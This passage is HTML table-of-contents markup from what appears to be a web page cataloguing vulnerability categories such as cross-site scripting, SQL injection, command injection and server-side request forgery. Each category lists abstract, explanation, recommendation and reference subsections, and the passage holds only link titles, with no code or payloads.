class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-10"><span class="toc-number">1.2.9.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-10"><span class="toc-number">1.2.9.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak"><span class="toc-number">1.2.10.</span> <span class="toc-text">System Information Leak</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-11"><span class="toc-number">1.2.10.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-11"><span class="toc-number">1.2.10.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-11"><span class="toc-number">1.2.10.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-11"><span class="toc-number">1.2.10.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-External"><span class="toc-number">1.2.11.</span> <span class="toc-text">System Information Leak: External</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-12"><span class="toc-number">1.2.11.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-12"><span class="toc-number">1.2.11.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-12"><span class="toc-number">1.2.11.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-12"><span class="toc-number">1.2.11.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Internal"><span class="toc-number">1.2.12.</span> <span class="toc-text">System Information Leak: Internal</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-13"><span class="toc-number">1.2.12.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-13"><span class="toc-number">1.2.12.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-13"><span class="toc-number">1.2.12.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-13"><span class="toc-number">1.2.12.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Trust-Boundary-Violation"><span class="toc-number">1.2.13.</span> <span class="toc-text">Trust Boundary Violation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-14"><span class="toc-number">1.2.13.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-14"><span class="toc-number">1.2.13.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-14"><span class="toc-number">1.2.13.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-14"><span class="toc-number">1.2.13.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境配置"><span class="toc-number">1.3.</span> <span class="toc-text">环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-MIME-Sniffing"><span class="toc-number">1.3.1.</span> <span class="toc-text">HTML5: MIME Sniffing</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-15"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-15"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-15"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-15"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Helmet-Misconfiguration-Insecure-XSS-Filter"><span class="toc-number">1.3.2.</span> <span class="toc-text">Helmet Misconfiguration: Insecure XSS Filter</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-16"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-16"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-16"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-16"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#输入验证与展示问题"><span class="toc-number">1.4.</span> <span class="toc-text">输入验证与展示问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Client-Side-Template-Injection"><span class="toc-number">1.4.1.</span> <span class="toc-text">Client-Side Template Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-17"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-17"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-17"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-17"><span class="toc-number">1.4.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Command-Injection"><span class="toc-number">1.4.2.</span> <span class="toc-text">Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-18"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-18"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-18"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-18"><span class="toc-number">1.4.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-DOM"><span class="toc-number">1.4.3.</span> <span class="toc-text">Cross-Site Scripting: DOM</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-19"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-19"><span class="toc-number">1.4.3.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-19"><span class="toc-number">1.4.3.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-19"><span class="toc-number">1.4.3.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-Persistent"><span class="toc-number">1.4.4.</span> <span class="toc-text">Cross-Site Scripting: Persistent</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-20"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-20"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-20"><span class="toc-number">1.4.4.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-20"><span class="toc-number">1.4.4.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-Poor-Validation"><span class="toc-number">1.4.5.</span> <span class="toc-text">Cross-Site Scripting: Poor Validation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-21"><span class="toc-number">1.4.5.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-21"><span class="toc-number">1.4.5.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-21"><span class="toc-number">1.4.5.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-21"><span class="toc-number">1.4.5.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-Reflected"><span class="toc-number">1.4.6.</span> <span class="toc-text">Cross-Site Scripting: Reflected</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-22"><span class="toc-number">1.4.6.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-22"><span class="toc-number">1.4.6.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-22"><span class="toc-number">1.4.6.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-22"><span class="toc-number">1.4.6.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-SOP-Bypass"><span class="toc-number">1.4.7.</span> <span class="toc-text">Cross-Site Scripting: SOP Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-23"><span class="toc-number">1.4.7.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-23"><span class="toc-number">1.4.7.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-23"><span class="toc-number">1.4.7.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-23"><span class="toc-number">1.4.7.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-Self"><span class="toc-number">1.4.8.</span> <span class="toc-text">Cross-Site Scripting: Self</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-24"><span class="toc-number">1.4.8.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-24"><span class="toc-number">1.4.8.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-24"><span class="toc-number">1.4.8.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-24"><span class="toc-number">1.4.8.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Denial-of-Service"><span class="toc-number">1.4.9.</span> <span class="toc-text">Denial of Service</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-25"><span class="toc-number">1.4.9.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-25"><span class="toc-number">1.4.9.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-25"><span class="toc-number">1.4.9.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-25"><span class="toc-number">1.4.9.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Denial-of-Service-Regular-Expression"><span class="toc-number">1.4.10.</span> <span class="toc-text">Denial of Service: Regular Expression</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-26"><span class="toc-number">1.4.10.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-26"><span class="toc-number">1.4.10.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-26"><span class="toc-number">1.4.10.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-26"><span class="toc-number">1.4.10.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-Code-Injection"><span class="toc-number">1.4.11.</span> <span class="toc-text">Dynamic Code Evaluation: Code Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-27"><span class="toc-number">1.4.11.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-27"><span class="toc-number">1.4.11.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-27"><span class="toc-number">1.4.11.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-27"><span class="toc-number">1.4.11.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-Script-Injection"><span class="toc-number">1.4.12.</span> <span class="toc-text">Dynamic Code Evaluation: Script Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-28"><span class="toc-number">1.4.12.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-28"><span class="toc-number">1.4.12.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-28"><span class="toc-number">1.4.12.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-28"><span class="toc-number">1.4.12.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-Unsafe-YAML-Deserialization"><span class="toc-number">1.4.13.</span> <span class="toc-text">Dynamic Code Evaluation: Unsafe YAML Deserialization</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-29"><span class="toc-number">1.4.13.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-29"><span class="toc-number">1.4.13.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-29"><span class="toc-number">1.4.13.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-29"><span class="toc-number">1.4.13.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Cross-Site-Scripting-Protection"><span class="toc-number">1.4.14.</span> <span class="toc-text">HTML5: Cross-Site Scripting Protection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-30"><span class="toc-number">1.4.14.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-30"><span class="toc-number">1.4.14.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-30"><span class="toc-number">1.4.14.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-30"><span class="toc-number">1.4.14.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Header-Manipulation"><span class="toc-number">1.4.15.</span> <span class="toc-text">Header Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-31"><span class="toc-number">1.4.15.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-31"><span class="toc-number">1.4.15.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-31"><span class="toc-number">1.4.15.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-31"><span class="toc-number">1.4.15.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Header-Manipulation-Cookies"><span class="toc-number">1.4.16.</span> <span class="toc-text">Header Manipulation: Cookies</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-32"><span class="toc-number">1.4.16.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-32"><span class="toc-number">1.4.16.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-32"><span class="toc-number">1.4.16.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-32"><span class="toc-number">1.4.16.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JSON-Injection"><span class="toc-number">1.4.17.</span> <span class="toc-text">JSON Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-33"><span class="toc-number">1.4.17.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-33"><span class="toc-number">1.4.17.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-33"><span class="toc-number">1.4.17.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-33"><span class="toc-number">1.4.17.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Log-Forging"><span class="toc-number">1.4.18.</span> <span class="toc-text">Log Forging</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-34"><span class="toc-number">1.4.18.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-34"><span class="toc-number">1.4.18.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-34"><span class="toc-number">1.4.18.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-34"><span class="toc-number">1.4.18.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Log-Forging-debug"><span class="toc-number">1.4.19.</span> <span class="toc-text">Log Forging (debug)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-35"><span class="toc-number">1.4.19.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-35"><span class="toc-number">1.4.19.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-35"><span class="toc-number">1.4.19.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-35"><span class="toc-number">1.4.19.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Open-Redirect"><span class="toc-number">1.4.20.</span> <span class="toc-text">Open Redirect</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-36"><span class="toc-number">1.4.20.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-36"><span class="toc-number">1.4.20.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-36"><span class="toc-number">1.4.20.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-36"><span class="toc-number">1.4.20.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Path-Manipulation"><span class="toc-number">1.4.21.</span> <span class="toc-text">Path Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-37"><span class="toc-number">1.4.21.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-37"><span class="toc-number">1.4.21.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-37"><span class="toc-number">1.4.21.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-37"><span class="toc-number">1.4.21.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Path-Manipulation-Zip-Entry-Overwrite"><span class="toc-number">1.4.22.</span> <span class="toc-text">Path Manipulation: Zip Entry Overwrite</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-38"><span class="toc-number">1.4.22.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-38"><span class="toc-number">1.4.22.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-38"><span class="toc-number">1.4.22.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-38"><span class="toc-number">1.4.22.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Process-Control"><span class="toc-number">1.4.23.</span> <span class="toc-text">Process Control</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-39"><span class="toc-number">1.4.23.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-39"><span class="toc-number">1.4.23.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-39"><span class="toc-number">1.4.23.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-39"><span class="toc-number">1.4.23.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Resource-Injection"><span class="toc-number">1.4.24.</span> <span class="toc-text">Resource Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-40"><span class="toc-number">1.4.24.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-40"><span class="toc-number">1.4.24.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-40"><span class="toc-number">1.4.24.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-40"><span class="toc-number">1.4.24.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection"><span class="toc-number">1.4.25.</span> <span class="toc-text">SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-41"><span class="toc-number">1.4.25.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-41"><span class="toc-number">1.4.25.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-41"><span class="toc-number">1.4.25.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-41"><span class="toc-number">1.4.25.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Server-Side-Request-Forgery"><span class="toc-number">1.4.26.</span> <span class="toc-text">Server-Side Request Forgery</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-42"><span class="toc-number">1.4.26.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-42"><span class="toc-number">1.4.26.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-42"><span class="toc-number">1.4.26.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-42"><span class="toc-number">1.4.26.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Server-Side-Template-Injection"><span class="toc-number">1.4.27.</span> <span class="toc-text">Server-Side Template Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-43"><span class="toc-number">1.4.27.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-43"><span class="toc-number">1.4.27.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-43"><span class="toc-number">1.4.27.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-43"><span class="toc-number">1.4.27.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Setting-Manipulation"><span class="toc-number">1.4.28.</span> <span class="toc-text">Setting Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-44"><span class="toc-number">1.4.28.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-44"><span class="toc-number">1.4.28.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-44"><span class="toc-number">1.4.28.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Setting-Manipulation-User-Controlled-Expression-Delimiters"><span class="toc-number">1.4.29.</span> <span class="toc-text">Setting Manipulation: User-Controlled Expression Delimiters</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-45"><span class="toc-number">1.4.29.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-45"><span class="toc-number">1.4.29.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-45"><span class="toc-number">1.4.29.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-44"><span 